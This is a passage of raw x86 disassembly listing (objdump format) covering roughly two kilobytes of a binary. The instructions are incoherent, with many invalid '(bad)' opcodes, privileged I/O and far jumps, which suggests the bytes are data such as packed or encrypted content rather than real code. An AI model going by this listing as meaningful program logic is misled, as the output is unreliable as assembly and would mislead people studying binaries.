  4114ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411500:	data16 fsub QWORD PTR [ebp+ebx*8+0x3e]
  411505:	aam    0x1e
  411507:	enter  0x98e,0xbb
  41150b:	xchg   edx,eax
  41150c:	icebp  
  41150d:	push   ecx
  41150e:	retf   
  41150f:	inc    esp
  411510:	mov    eax,ds:0xd9f8fcfc
  411515:	in     al,dx
  411516:	pop    edi
  411517:	(bad)  
  411518:	clc    
  411519:	dec    edx
  41151a:	adc    ecx,eax
  41151c:	add    al,0xbf
  41151e:	or     BYTE PTR [edi],ah
  411520:	jg     0x41152a
  411522:	mov    ebx,0x4727eb3a
  411527:	inc    edi
  411528:	sbb    eax,0xb2334c57
  41152d:	fild   WORD PTR [eax]
  41152f:	fnsave [ecx-0x68dd6be9]
  411535:	adc    BYTE PTR [eax],al
  411537:	int3   
  411538:	(bad)  
  411539:	loope  0x411597
  41153b:	inc    ebp
  41153c:	iret   
  41153d:	test   BYTE PTR fs:[edi],bh
  411540:	imul   ebx,ebp,0x5
  411543:	and    ebx,DWORD PTR [eax]
  411545:	fsub   DWORD PTR [ecx]
  411547:	lea    ebx,[ecx-0xc]
  41154a:	sbb    al,0xe5
  41154c:	inc    ebx
  41154d:	cmp    ch,dl
  41154f:	arpl   cx,bp
  411551:	sub    eax,0xbbd65d5a
  411556:	mov    BYTE PTR [eax+0x1ac45d0d],cl
  41155c:	adc    bh,bl
  41155e:	push   ss
  41155f:	push   ebp
  411560:	fiadd  DWORD PTR [eax]
  411562:	ror    DWORD PTR [edi-0xa6cf4c9],cl
  411568:	jmp    0x411537
  41156a:	dec    esp
  41156b:	arpl   di,di
  41156d:	cld    
  41156e:	or     BYTE PTR [esi-0x40],cl
  411571:	fisttp WORD PTR [ebp-0x57d4a9c3]
  411577:	inc    ecx
  411578:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411579:	inc    esi
  41157a:	std    
  41157b:	push   ebp
  41157c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41157d:	arpl   WORD PTR [edi],ax
  41157f:	(bad)  
  411580:	in     al,dx
  411581:	call   0x93a2dde8
  411586:	imul   eax
  411588:	cmp    eax,0xebdcda69
  41158d:	push   edi
  41158e:	dec    edi
  41158f:	inc    edi
  411590:	pop    esi
  411591:	ins    BYTE PTR es:[edi],dx
  411592:	ror    BYTE PTR [edi+0x7],1
  411595:	xor    eax,0x4467c8b1
  41159a:	cmp    esi,DWORD PTR [eax+0x17]
  41159d:	push   ebp
  41159e:	inc    ebp
  41159f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115a0:	jmp    0x411620
  4115a2:	xor    al,0x81
  4115a4:	lods   al,BYTE PTR ds:[esi]
  4115a5:	mov    edx,DWORD PTR [esi-0x4923cd70]
  4115ab:	leave  
  4115ac:	and    ch,BYTE PTR [eax+0x42]
  4115af:	(bad)  
  4115b0:	imul   esi,DWORD PTR [esi+ebp*4],0x74
  4115b4:	out    0x60,al
  4115b6:	outs   dx,BYTE PTR ds:[esi]
  4115b7:	popf   
  4115b8:	xlat   BYTE PTR ds:[ebx]
  4115b9:	add    eax,0x5997b00d
  4115be:	das    
  4115bf:	enter  0x97e9,0x2d
  4115c3:	mov    ebp,0x98bebe86
  4115c8:	jmp    0x411607
  4115ca:	inc    edi
  4115cb:	push   ebp
  4115cc:	push   es
  4115cd:	and    esi,DWORD PTR [edx-0x78]
  4115d0:	(bad)  
  4115d1:	fistp  QWORD PTR [edx-0x3232b73b]
  4115d7:	pop    es
  4115d8:	retf   0xfd50
  4115db:	das    
  4115dc:	pop    esi
  4115dd:	mov    dh,BYTE PTR [esi]
  4115df:	jecxz  0x4115e4
  4115e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115e2:	pop    ebx
  4115e3:	shl    DWORD PTR [ecx-0x14bcb814],1
  4115e9:	mov    bl,0x1d
  4115eb:	mov    al,ch
  4115ed:	(bad)  
  4115ee:	cld    
  4115ef:	loopne 0x4115d4
  4115f1:	ds pop edi
  4115f3:	inc    ecx
  4115f4:	and    eax,DWORD PTR [ecx+0x54]
  4115f7:	enter  0x11b4,0xad
  4115fb:	sti    
  4115fc:	adc    eax,0xeb359336
  411601:	mov    cl,0xe9
  411603:	cld    
  411604:	push   esp
  411605:	mov    ebx,0xded9bada
  41160a:	in     al,0x1a
  41160c:	add    DWORD PTR [ebx+0x1e80d9a8],edi
  411612:	(bad)  
  411614:	pop    esp
  411615:	mov    ebp,0xa337a700
  41161a:	mov    esp,0xf68ac296
  41161f:	push   eax
  411620:	xchg   edi,eax
  411621:	fucomip st,st(1)
  411623:	xor    ebp,DWORD PTR [ebp-0x2b1e31ca]
  411629:	in     eax,0xfc
  41162b:	xchg   edi,eax
  41162c:	jnp    0x411693
  41162e:	add    eax,0xebd1e790
  411633:	(bad)  
  411634:	aad    0xf
  411636:	inc    eax
  411637:	fist   DWORD PTR [edi+eax*1]
  41163a:	retf   0xe98a
  41163d:	dec    esp
  41163e:	dec    edi
  41163f:	jb     0x4115f0
  411641:	jo     0x411653
  411643:	sub    BYTE PTR [ecx-0x3730b529],dh
  411649:	xor    ch,dl
  41164b:	lods   al,BYTE PTR ds:[esi]
  41164c:	imul   esp,DWORD PTR [eax*8+0xf9aa06],0x3d
  411654:	dec    ebx
  411655:	inc    esi
  411656:	mov    ebp,0xad694d32
  41165b:	repz aam 0xdf
  41165e:	ror    DWORD PTR [esi-0x79e3429f],cl
  411664:	cli    
  411665:	mov    ah,0xff
  411667:	out    dx,eax
  411668:	mov    dh,0x93
  41166a:	bound  ebx,QWORD PTR [edx]
  41166c:	and    ecx,DWORD PTR [edi-0x208319ab]
  411672:	mov    eax,ds:0x74462527
  411677:	cmp    DWORD PTR [ebx+0x5f4afcf0],0x6174acb8
  411681:	cmp    al,0x59
  411683:	enter  0x8886,0x87
  411687:	mov    BYTE PTR [edi-0x226b4ee6],0xfa
  41168e:	add    eax,0xf1609cc8
  411693:	shr    ecx,1
  411695:	(bad)  
  411696:	ffreep st(7)
  411698:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411699:	adc    dl,BYTE PTR [ecx-0x5a]
  41169c:	dec    ecx
  41169d:	ror    ebp,cl
  41169f:	and    DWORD PTR [edi+0x16ce0051],edx
  4116a5:	push   DWORD PTR [edi]
  4116a7:	fcomp  DWORD PTR [eax+0x1dcd6327]
  4116ad:	add    eax,0x56be157
  4116b2:	inc    ebp
  4116b3:	rcl    bl,cl
  4116b5:	inc    esi
  4116b6:	popa   
  4116b7:	push   edi
  4116b8:	jmp    0x4116d8
  4116ba:	retf   
  4116bb:	aas    
  4116bc:	mov    ebx,DWORD PTR [ebp-0x2062efb8]
  4116c2:	(bad)  
  4116c3:	stc    
  4116c4:	sbb    DWORD PTR [edi+0xb],0xfcd7a2e3
  4116cb:	test   ah,0x1c
  4116ce:	(bad)  
  4116cf:	adc    bh,bh
  4116d1:	add    cl,bl
  4116d3:	pushf  
  4116d4:	pop    esp
  4116d5:	fild   QWORD PTR [edi]
  4116d7:	ret    
  4116d8:	arpl   WORD PTR [edx-0x65],ax
  4116db:	addr16 addr16 sub ebp,edi
  4116df:	dec    edi
  4116e0:	pop    edx
  4116e1:	add    BYTE PTR [eax+ecx*2+0x69],bh
  4116e5:	imul   eax,DWORD PTR [ebx-0x37],0xe2e62b72
  4116ec:	dec    edx
  4116ed:	mov    dl,0x89
  4116ef:	or     al,0xf0
  4116f1:	jle    0x4116f0
  4116f3:	adc    eax,0x39a2418e
  4116f8:	mov    ebp,0x55bdbdf9
  4116fd:	(bad)  
  4116fe:	mov    BYTE PTR cs:[ebp+0x7b],al
  411702:	repz xor BYTE PTR [eax-0x17a25ec5],cl
  411709:	mov    esi,0xcef59f4b
  41170e:	jl     0x41170c
  411710:	inc    eax
  411711:	adc    DWORD PTR [eax],0xffffff9e
  411714:	xchg   ebx,eax
  411715:	fisttp WORD PTR [ebx]
  411717:	fcmove st,st(3)
  411719:	pop    ss
  41171a:	mov    dl,0x1b
  41171c:	sahf   
  41171d:	adc    al,0xdb
  41171f:	pop    ecx
  411720:	mov    bh,0xf
  411722:	in     al,0xca
  411724:	xchg   ecx,eax
  411725:	out    0xdb,eax
  411727:	push   esi
  411728:	mov    eax,ds:0x3e1090de
  41172d:	xchg   cl,ch
  41172f:	fcomp  DWORD PTR [ebx+eax*2+0x5ae053b6]
  411736:	xlat   BYTE PTR ds:[ebx]
  411737:	inc    edi
  411738:	int    0x5e
  41173a:	dec    edi
  41173b:	xor    eax,0xc89d246f
  411740:	fidivr DWORD PTR [esi-0x24]
  411743:	jg     0x41176b
  411745:	in     eax,0x80
  411747:	sub    eax,0x6cbccceb
  41174c:	adc    al,0xa2
  41174e:	jb     0x4117b7
  411750:	outs   dx,BYTE PTR ds:[esi]
  411751:	fistp  WORD PTR [esi]
  411753:	xchg   edx,eax
  411754:	mov    ebx,0xdd82916e
  411759:	push   ss
  41175a:	cld    
  41175b:	js     0x411755
  41175d:	test   dl,0x0
  411760:	mov    ebp,0x1c60b0e0
  411765:	or     al,0x81
  411767:	inc    eax
  411768:	adc    edx,DWORD PTR [edx+0x32]
  41176b:	enter  0xfe0b,0x7f
  41176f:	add    ebp,DWORD PTR ds:0xebf9251c
  411775:	clc    
  411776:	cmp    BYTE PTR [ebp+0x4b],dl
  411779:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41177a:	push   ecx
  41177b:	not    DWORD PTR ds:0xc18873df
  411781:	enter  0xc5db,0x2
  411785:	push   esi
  411786:	mov    WORD PTR [eax-0x20996ffa],cs
  41178c:	fwait
  41178d:	cs std 
  41178f:	mov    ds:0x4efe2b53,al
  411794:	mov    ah,0x21
  411796:	ins    DWORD PTR es:[edi],dx
  411797:	or     ch,bl
  411799:	xor    edi,esi
  41179b:	add    ebx,DWORD PTR [esi-0xf]
  41179e:	dec    esp
  41179f:	add    eax,0x96aedf51
  4117a4:	ins    BYTE PTR es:[edi],dx
  4117a5:	adc    esi,DWORD PTR [ecx+0x7c]
  4117a8:	ja     0x411818
  4117aa:	std    
  4117ab:	cmp    ebp,ebx
  4117ad:	iret   
  4117ae:	int3   
  4117af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117b0:	cs pop edx
  4117b2:	push   ecx
  4117b3:	int3   
  4117b4:	ret    
  4117b5:	fisubr WORD PTR [ecx+0x2e3fdd81]
  4117bb:	sahf   
  4117bc:	jmp    0x411836
  4117be:	and    al,0x26
  4117c0:	pop    edi
  4117c1:	scas   al,BYTE PTR es:[edi]
  4117c2:	sbb    eax,0x39f9df85
  4117c8:	leave  
  4117c9:	ret    0xbe5c
  4117cc:	pop    ss
  4117cd:	or     eax,0x4ed51afc
  4117d2:	add    al,0x1d
  4117d4:	retf   
  4117d5:	jl     0x41181d
  4117d7:	nop    edi
  4117da:	push   edx
  4117db:	sbb    al,0x47
  4117dd:	sub    BYTE PTR [eax],cl
  4117df:	jl     0x411821
  4117e1:	xchg   ebp,edi
  4117e3:	push   eax
  4117e4:	adc    al,BYTE PTR [eax+0x2ff461b6]
  4117ea:	or     al,0xe2
  4117ed:	mov    esi,0x811ecb77
  4117f2:	push   ss
  4117f3:	inc    edx
  4117f4:	(bad)  
  4117f5:	repz jecxz 0x4117d9
  4117f8:	sbb    eax,0x55c8358a
  4117fd:	mov    cl,0x4
  4117ff:	pusha  
  411800:	ret    
  411801:	daa    
  411802:	pop    esp
  411803:	enter  0x6837,0x52
  411807:	ss retf 0xd48d
  41180b:	(bad)  
  41180c:	jmp    0x411874
  41180e:	stc    
  41180f:	pop    ebp
  411810:	push   ebp
  411811:	test   eax,0xdf810625
  411816:	fsubp  st(5),st
  411818:	scas   eax,DWORD PTR es:[edi]
  411819:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41181a:	int3   
  41181b:	hlt    
  41181c:	clc    
  41181d:	into   
  41181e:	and    dh,cl
  411820:	in     al,dx
  411821:	popa   
  411822:	imul   ebp,DWORD PTR [eax+edx*4],0x4c
  411826:	mov    bh,0x8e
  411828:	retf   
  411829:	icebp  
  41182a:	push   edx
  41182b:	enter  0x6816,0x8b
  41182f:	lds    edi,FWORD PTR [edi]
  411831:	imul   edx,DWORD PTR [edi-0x4f0a2090],0xfffffffc
  411838:	dec    eax
  411839:	rol    BYTE PTR [ecx],cl
  41183b:	and    ch,BYTE PTR gs:[esi]
  41183e:	jl     0x4117fb
  411840:	daa    
  411841:	pop    ds
  411842:	xor    BYTE PTR [ebx+0x3f4d1f33],cl
  411848:	push   ds
  411849:	fbstp  TBYTE PTR [esi+0x2ed83d42]
  41184f:	pop    eax
  411850:	mov    edx,0xf729fd4a
  411855:	xor    dh,BYTE PTR [esi+edx*4-0x80]
  411859:	jo     0x411832
  41185b:	(bad)  
  41185c:	mov    al,0xfd
  41185e:	or     eax,0xc891c85f
  411863:	(bad)  
  411865:	add    BYTE PTR [ebp+esi*2-0x579ea6f2],bl
  41186c:	mov    ds:0x2c2a22df,al
  411871:	push   ss
  411872:	leave  
  411873:	int3   
  411874:	or     al,0x11
  411876:	std    
  411877:	add    bl,BYTE PTR [eax+eax*2+0x7ce86250]
  41187e:	mov    ecx,eax
  411880:	dec    DWORD PTR [ebx+eax*2+0x2c3a5477]
  411887:	fucomp st(3)
  411889:	inc    edx
  41188a:	(bad)
  41188d:	push   esi
  41188e:	hlt    
  41188f:	xchg   ebx,eax
  411890:	push   edi
  411891:	xor    eax,0x60acc8c2
  411896:	cmp    esp,esp
  411898:	or     eax,0xee6e3a6a
  41189d:	frstpm(287 only) 
  41189f:	pop    esi
  4118a0:	pop    eax
  4118a1:	clc    
  4118a2:	lods   al,BYTE PTR ds:[esi]
  4118a3:	call   0x59638588
  4118a8:	mov    ecx,0x750c3fdf
  4118ad:	add    dl,BYTE PTR [ebp-0x49]
  4118b0:	mov    edi,DWORD PTR [eax-0x3]
  4118b3:	add    DWORD PTR cs:[esi+esi*4],esi
  4118b7:	in     al,0x97
  4118b9:	neg    dh
  4118bb:	fld    TBYTE PTR [ebx+0x24]
  4118be:	std    
  4118bf:	pop    ss
  4118c0:	sbb    eax,0x76289c60
  4118c5:	mov    edx,0x58f441fc
  4118ca:	or     BYTE PTR [eax-0x371823cc],0x5
  4118d1:	mov    dh,BYTE PTR cs:[edx]
  4118d4:	cld    
  4118d5:	mov    eax,0x2f0b1f83
  4118da:	(bad)
  4118dd:	bound  ebx,QWORD PTR [edi-0x1dbb1c34]
  4118e3:	ror    BYTE PTR [edx-0x21],1
  4118e6:	out    dx,al
  4118e7:	dec    ebp
  4118e8:	test   al,0x49
  4118ea:	repz and eax,0xd3fbecd2
  4118f0:	and    eax,0x6d089173
  4118f5:	cmp    ebx,ecx
  4118f7:	dec    eax
  4118f8:	scas   eax,DWORD PTR es:[edi]
  4118f9:	aam    0x47
  4118fb:	sub    BYTE PTR [esi-0x18],ch
  4118fe:	jl     0x4118d7
  411900:	aam    0x1f
  411902:	repnz mov bh,0x75
  411905:	les    esp,FWORD PTR [eax-0x1b92143c]
  41190b:	mov    WORD PTR [ecx+0x4275a21],cs
  411911:	fld    QWORD PTR [ebx-0x52]
  411914:	sub    DWORD PTR [esi+0x30],esp
  411917:	push   ecx
  411918:	xor    ebx,DWORD PTR [esi+0x76eb8b23]
  41191e:	shr    al,1
  411920:	lock push eax
  411922:	out    0x69,eax
  411924:	xor    cl,BYTE PTR [ebx]
  411926:	ja     0x41193a
  411928:	jmp    0x4119a8
  41192a:	xchg   ebp,eax
  41192b:	push   eax
  41192c:	add    DWORD PTR [eax],esi
  41192e:	or     bh,BYTE PTR ds:0xbcf6aceb
  411934:	push   ss
  411935:	cmp    bl,BYTE PTR [edx-0x701de206]
  41193b:	xchg   edi,eax
  41193c:	sbb    BYTE PTR [ebx],dh
  41193e:	mov    edx,0x4a9ffb47
  411943:	call   0x133ddae8
  411948:	xor    BYTE PTR [edi-0x5b864bb7],bh
  41194e:	dec    esp
  41194f:	retf   
  411950:	cli    
  411951:	pop    edx
  411952:	ins    BYTE PTR es:[edi],dx
  411953:	sbb    DWORD PTR [esi+0x36],ecx
  411956:	lds    eax,FWORD PTR [ebp-0x3502c42a]
  41195c:	fldcw  WORD PTR [eax]
  41195e:	xor    al,0x53
  411960:	or     al,0xe6
  411962:	xchg   edi,eax
  411963:	enter  0x7eaf,0xf8
  411967:	out    0x82,al
  411969:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41196a:	sbb    ebp,edi
  41196c:	jmp    0x4119d8
  41196e:	fild   DWORD PTR [esi-0x21]
  411971:	dec    edx
  411972:	pop    ebx
  411973:	adc    esp,edi
  411975:	fdiv   QWORD PTR [esi]
  411977:	sbb    ecx,DWORD PTR [ebx+edx*8]
  41197a:	imul   ecx,ebx,0xc
  41197d:	jbe    0x411953
  41197f:	daa    
  411980:	xchg   esp,eax
  411981:	outs   dx,BYTE PTR ds:[esi]
  411982:	std    
  411983:	jbe    0x41192d
  411985:	retf   0x3c70
  411988:	sbb    eax,0x6dc7e466
  41198d:	adc    eax,0xe1c78c35
  411992:	sbb    dl,BYTE PTR [edi-0x185aa14]
  411998:	ret    0xae9a
  41199b:	aam    0x27
  41199d:	mov    esi,0x33beecb0
  4119a2:	ror    al,1
  4119a4:	jns    0x411928
  4119a6:	fcomi  st,st(0)
  4119a8:	mov    eax,0xebbaab41
  4119ad:	ds enter 0x7072,0x6e
  4119b2:	adc    bl,BYTE PTR [ecx-0x11ff202f]
  4119b8:	je     0x4119c1
  4119ba:	or     edx,ecx
  4119bc:	std    
  4119bd:	enter  0xeffc,0xbc
  4119c1:	shr    BYTE PTR [ebp-0x18],0x7
  4119c5:	or     cl,BYTE PTR [ebx+0x68]
  4119c8:	and    al,0xe7
  4119ca:	jmp    0x6bc7:0x10cf77ce
  4119d1:	mov    eax,ds:0x775e2d1f
  4119d6:	std    
  4119d7:	mov    eax,0xea085fee
  4119dc:	inc    ebp
  4119dd:	lods   eax,DWORD PTR ds:[esi]
  4119de:	inc    eax
  4119df:	enter  0x5107,0x9
  4119e3:	les    eax,FWORD PTR [ebx-0x146b40db]
  4119e9:	pop    ebp
  4119ea:	sub    al,BYTE PTR [ebp-0x72796795]
  4119f0:	pop    edi
  4119f1:	fldl2e 
  4119f3:	lds    eax,FWORD PTR ds:0x457de276
  4119f9:	fild   WORD PTR [esi+0x54]
  4119fc:	(bad)  
  4119fd:	adc    edx,DWORD PTR ds:0xb3b9ffdc
  411a03:	aaa    
  411a04:	push   0xffffffe9
  411a06:	outs   dx,DWORD PTR ds:[esi]
  411a07:	push   es
  411a08:	xor    BYTE PTR [esi-0x5b],cl
  411a0b:	rol    DWORD PTR [ebx+0x29],cl
  411a0e:	enter  0x6424,0xde
  411a12:	ins    BYTE PTR es:[edi],dx
  411a13:	jae    0x4119a4
  411a15:	push   ds
  411a16:	mov    ah,BYTE PTR [ebp-0x5e]
  411a19:	mov    edi,0x1aeba9f7
  411a1e:	xchg   ebp,eax
  411a1f:	jl     0x411a07
  411a21:	add    DWORD PTR [esi-0x5b200837],ebp
  411a27:	fbld   TBYTE PTR [ebp-0x72]
  411a2a:	or     eax,0xa74c8edb
  411a2f:	sbb    edi,0x30
  411a32:	pop    esp
  411a33:	xchg   esp,eax
  411a34:	jmp    0x411a2e
  411a36:	mov    dh,BYTE PTR [ecx]
  411a38:	push   0x3cce8582
  411a3d:	retf   
  411a3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a3f:	enter  0xfdbf,0xba
  411a43:	adc    al,0x47
  411a45:	jb     0x411a3e
  411a47:	hlt    
  411a48:	call   0x16c7895c
  411a4d:	sahf   
  411a4e:	mov    esp,0xa9e5c650
  411a53:	sahf   
  411a54:	ins    BYTE PTR es:[edi],dx
  411a55:	fistp  WORD PTR [esp+ecx*8-0xdd8e3db]
  411a5c:	pop    ds
  411a5d:	mov    ch,0x40
  411a5f:	xchg   DWORD PTR [esi-0x3f03e627],edi
  411a65:	aas    
  411a66:	jmp    0xdbc7:0xde90582c
  411a6d:	call   0xeea8:0x35050fb0
  411a74:	jmp    0x411a47
  411a76:	lock cmp esi,DWORD PTR [esi-0x53]
  411a7a:	adc    ecx,ebp
  411a7c:	jge    0x411a5e
  411a7e:	xor    BYTE PTR [edx-0x4b1bc9f4],ah
  411a84:	sbb    DWORD PTR [edi],ebx
  411a86:	(bad)  
  411a87:	pop    edx
  411a88:	(bad)  [eax*2+0x63dfd3a9]
  411a8f:	xchg   edx,eax
  411a90:	add    eax,0x90145a96
  411a95:	fucomip st,st(2)
  411a97:	xor    bl,BYTE PTR [ebx]
  411a99:	or     esp,DWORD PTR ds:0xfd4e7885
  411a9f:	jne    0x411a35
  411aa1:	mov    ch,0xb7
  411aa3:	call   0x456c:0x38bfc5d7
  411aaa:	leave  
  411aab:	leave  
  411aac:	push   ebx
  411aad:	xor    BYTE PTR [eax+eiz*4],ch
  411ab0:	out    0xc1,al
  411ab2:	adc    DWORD PTR [edi+ebx*1],0x69c9f3cf
  411ab9:	pop    ss
  411aba:	add    al,0x8
  411abc:	(bad)  
  411abd:	jle    0x411a84
  411abf:	into   
  411ac0:	jo     0x411aa1
  411ac2:	mov    bl,0x3e
  411ac4:	hlt    
  411ac5:	or     al,0x77
  411ac7:	cmp    bl,BYTE PTR [ebx-0x4b2e0326]
  411acd:	cs cld 
  411acf:	jmp    0x411b2e
  411ad1:	dec    ebp
  411ad2:	dec    ebx
  411ad3:	retf   0x56b8
  411ad6:	pop    ds
  411ad7:	mov    edx,0x4c7d0866
  411adc:	push   ebp
  411add:	jle    0x411af9
  411adf:	loopne 0x411ac3
  411ae1:	into   
  411ae2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ae3:	dec    ecx
  411ae4:	std    
  411ae5:	loop   0x411b3c
  411ae7:	les    edi,FWORD PTR [ebx]
  411ae9:	adc    esp,esp
  411aeb:	pop    es
  411aec:	mov    cs,WORD PTR [esi]
  411aee:	lea    ecx,[edx]
  411af0:	jmp    0x411b02
  411af2:	inc    esi
  411af3:	mov    cl,0x3c
  411af5:	in     eax,0x52
  411af7:	sub    eax,0x5024dfd0
  411afc:	iret   
  411afd:	loopne 0x411b4e
  411aff:	xchg   ebp,eax
  411b00:	push   ebp
  411b01:	jb     0x411b00
  411b03:	jns    0x411b19
  411b05:	test   BYTE PTR [eax+0x32],ah
  411b08:	push   ecx
  411b09:	retf   0xc840
  411b0c:	lahf   
  411b0d:	cdq    
  411b0e:	pop    ecx
  411b0f:	fwait
  411b10:	sar    ecx,0x1a
  411b13:	addr16 in al,dx
  411b15:	in     al,0xf2
  411b17:	call   0x17d0a15b
  411b1c:	pop    es
  411b1d:	xor    DWORD PTR [ecx-0x38],esi
  411b20:	mov    eax,DWORD PTR [ebx+0x6f]
  411b23:	add    BYTE PTR [ebp*4-0xb14df85],ah
  411b2a:	and    al,bh
  411b2c:	int3   
  411b2d:	pushf  
  411b2e:	add    BYTE PTR [esi],cl
  411b30:	inc    esi
  411b31:	iret   
  411b32:	xor    al,cl
  411b34:	jl     0x411ad4
  411b36:	or     BYTE PTR [ebx+eax*4],ch
  411b39:	test   BYTE PTR [eax],bh
  411b3b:	fs out dx,al
  411b3d:	mov    al,ds:0x1f97d678
  411b42:	jmp    0x845bf238
  411b47:	enter  0xdd8e,0xec
  411b4b:	sub    ch,BYTE PTR ds:0xeb0c20bd
  411b51:	outs   dx,BYTE PTR ds:[esi]
  411b52:	sbb    eax,0xe924044f
  411b57:	test   BYTE PTR [edi+0xce419cd],bh
  411b5d:	push   cs
  411b5e:	mov    ebx,0x711067c8
  411b63:	loop   0x411b7d
  411b65:	inc    ecx
  411b66:	add    bh,ah
  411b68:	lods   eax,DWORD PTR ds:[esi]
  411b69:	push   0x3e3e1cf9
  411b6e:	jp     0x411ba2
  411b70:	aas    
  411b71:	push   ecx
  411b72:	mov    edi,0x7ffb13ce
  411b78:	jbe    0x411b69
  411b7a:	mov    al,gs:0x47fd6b32
  411b80:	mov    bh,BYTE PTR [ebx]
  411b82:	ror    ebx,1
  411b84:	sbb    esi,ecx
  411b86:	xchg   al,cl
  411b88:	add    ah,BYTE PTR [ebx-0x78]
  411b8b:	jmp    0xe3eb:0xa3fb9d0c
  411b92:	jecxz  0x411be2
  411b94:	jl     0x411bfc
  411b96:	adc    DWORD PTR [edi-0x7d],0x1da2f101
  411b9d:	fist   WORD PTR [edi-0x67]
  411ba0:	pop    esi
  411ba1:	mov    bl,0xb9
  411ba3:	or     eax,0xa2cc75cf
  411ba8:	jmp    0x54f:0x61392aff
  411baf:	(bad)  
  411bb0:	fcmovu st,st(7)
  411bb2:	sahf   
  411bb3:	inc    ebx
  411bb4:	outs   dx,DWORD PTR ds:[esi]
  411bb5:	pop    ss
  411bb6:	jge    0x411be8
  411bb8:	rep lods eax,DWORD PTR ds:[esi]
  411bba:	cld    
  411bbb:	repnz push 0x26b5ff50
  411bc1:	adc    esi,DWORD PTR [ebx+0x78]
  411bc4:	in     al,0x39
  411bc6:	js     0x411b90
  411bc8:	cwde   
  411bc9:	fcos   
  411bcb:	aas    
  411bcc:	jne    0x411b66
  411bce:	scas   al,BYTE PTR es:[edi]
  411bcf:	outs   dx,DWORD PTR ds:[esi]
  411bd0:	cli    
  411bd1:	mov    bl,0x3e
  411bd3:	shr    ebx,cl
  411bd5:	inc    ebx
  411bd6:	imul   edx,ecx,0xc81c188b
  411bdc:	mov    ds:0xe179581f,al
  411be1:	jecxz  0x411c47
  411be3:	mov    ecx,0x6e4b8ceb
  411be8:	stc    
  411be9:	ret    
  411bea:	jno    0x411bd1
  411bec:	loop   0x411bcd
  411bee:	pop    edx
  411bef:	or     eax,0x2f1c36f7
  411bf4:	add    al,BYTE PTR [ebx-0x3]
  411bf7:	call   0xda57:0xad327310
  411bfe:	pop    esi
  411bff:	leave  
  411c00:	mov    eax,ds:0xf60a58cf
  411c05:	out    dx,al
  411c06:	pop    ecx
  411c07:	adc    eax,0x7a7d4fdb
  411c0c:	cmc    
  411c0d:	sub    DWORD PTR [eax-0x1d20ed87],eax
  411c13:	mov    esi,DWORD PTR [esi]
  411c15:	pop    es
  411c16:	push   es
  411c17:	pop    esp
  411c18:	jmp    0x411c3e
  411c1a:	ret    0x1d29
  411c1d:	jmp    0x411c9b
  411c1f:	push   ecx
  411c20:	jl     0x411bfe
  411c22:	and    eax,0x73eea0
  411c27:	dec    esp
  411c28:	jmp    0x411c9b
  411c2a:	imul   edx,DWORD PTR [ebx+0x3c],0x14
  411c2e:	ss leave 
  411c30:	xor    al,0x1
  411c32:	push   ecx
  411c33:	xchg   esp,eax
  411c34:	mov    eax,ds:0x900d7d09
  411c39:	or     ebp,DWORD PTR [edi]
  411c3b:	fisttp WORD PTR [ebp+0x3b08fd5a]
  411c41:	cmp    eax,0x9aa41adb
  411c46:	(bad)  
  411c47:	leave  
  411c48:	popw   ds
  411c4a:	repz loope 0x411be6
  411c4d:	mov    ds:0xfeaf1fdf,eax
  411c52:	std    
  411c53:	icebp  
  411c54:	and    eax,0x655f233e
  411c59:	not    BYTE PTR [ecx-0x23efc44c]
  411c5f:	(bad)  
  411c60:	in     al,dx
  411c61:	xchg   esi,eax
  411c62:	ror    DWORD PTR [ebp+0x29],cl
  411c65:	push   es
  411c66:	push   esi
  411c67:	cmp    eax,0x7295b0eb
  411c6c:	ret    0x4db3
  411c6f:	push   es
  411c70:	jl     0x411c7c
  411c72:	adc    eax,ebx
  411c74:	jmp    0x411c56
  411c76:	jmp    0xebc4:0xc426020a
  411c7d:	dec    ebx
  411c7e:	adc    al,0x99
  411c80:	fidivr DWORD PTR [esi+ebp*4-0x3b]
  411c84:	jmp    0x1d28:0xa0d45eb
  411c8b:	dec    eax
  411c8c:	out    dx,al
  411c8d:	ja     0x411cab
  411c8f:	inc    edi
  411c90:	sbb    eax,0xeb3592d6
  411c95:	add    BYTE PTR [ebp+0x287f5b74],al
  411c9b:	mov    edi,0x42a0df2a
  411ca0:	jnp    0x411c92
  411ca2:	shl    BYTE PTR [eax-0x6e],cl
  411ca5:	shl    esi,cl
  411ca7:	push   0x31
  411ca9:	fcomip st,st(5)
  411cab:	sub    dl,BYTE PTR ds:0x2886e535
  411cb1:	fcom   QWORD PTR ds:0x692d6874
  411cb7:	jae    0x411d1c
  411cb9:	pushf  
  411cba:	pop    esi
  411cbb:	dec    esi
  411cbc:	jmp    0x411d1b
  411cbe:	or     BYTE PTR [esi-0x17],al
  411cc1:	add    BYTE PTR [edx+0x21d4b1d6],0xa2
  411cc8:	lods   al,BYTE PTR fs:[esi]
  411cca:	jnp    0x411ca1
  411ccc:	in     eax,dx
  411ccd:	jmp    FWORD PTR [edx+edi*4+0x60]
  411cd1:	mov    edx,0x29aeaafb
  411cd6:	(bad)  
  411cd8:	imul   esi,DWORD PTR [ecx-0x2a],0xffffffdd
  411cdc:	inc    eax
  411cdd:	loopne 0x411d0e
  411cdf:	or     dh,bl
  411ce1:	cs fcom st(7)
  411ce4:	cmp    DWORD PTR [ecx+0x6fead41e],esp
  411cea:	and    BYTE PTR [edx],bl
  411cec:	daa    
  411ced:	jecxz  0x411c87
  411cef:	sub    BYTE PTR [ebx+0x5f],dh
  411cf2:	jmp    0x411cc1
  411cf4:	fst    DWORD PTR [edi+0x382b8082]
  411cfa:	repz pop esp
  411cfc:	inc    esi
  411cfd:	out    0xfe,al
  411cff:	pop    esi
  411d00:	jg     0xbf6e157f
  411d06:	mov    ah,BYTE PTR [edi-0x42ba1f6d]
  411d0c:	js     0x411c9f
  411d0e:	sub    BYTE PTR [eax],0x94
  411d11:	cmovnp eax,ecx
  411d14:	out    dx,al
